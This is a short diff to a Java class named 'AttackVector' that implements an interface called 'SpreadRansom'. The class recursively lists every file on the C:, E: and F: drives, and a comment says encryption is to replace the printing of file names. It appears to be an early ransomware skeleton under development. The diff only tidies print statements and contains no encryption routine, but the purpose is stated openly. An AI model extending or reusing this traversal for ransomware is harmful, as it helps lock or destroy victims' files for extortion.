@@ -37,13 +37,13 @@ public class AttackVector implements SpreadRansom {
 						}
 					} catch (NullPointerException e) {
 					}
-					System.out.println("directory:" + file.getName() + "\n");
+
 					listf(file.getAbsolutePath(), dirs);
 
 					//
 				} else if (file.isFile()) {
 					System.out.println("\t" + file.getName());
-					// encryption instead of pronting names of files and directories
+					// encryption instead of printing names of files 
 
 				}
 			}
@@ -54,12 +54,8 @@ public class AttackVector implements SpreadRansom {
 	public void spread() {
 
 		Collection<File> _folderTree = null;
-		System.out.println("c:");
-		// listf("C:\\", _folderTree);
 		listf("C:\\", _folderTree);
-		System.out.println("\n E:");
 		listf("E:\\", _folderTree);
-		System.out.println("\nF:");
 		listf("F:\\", _folderTree);
 	}
 
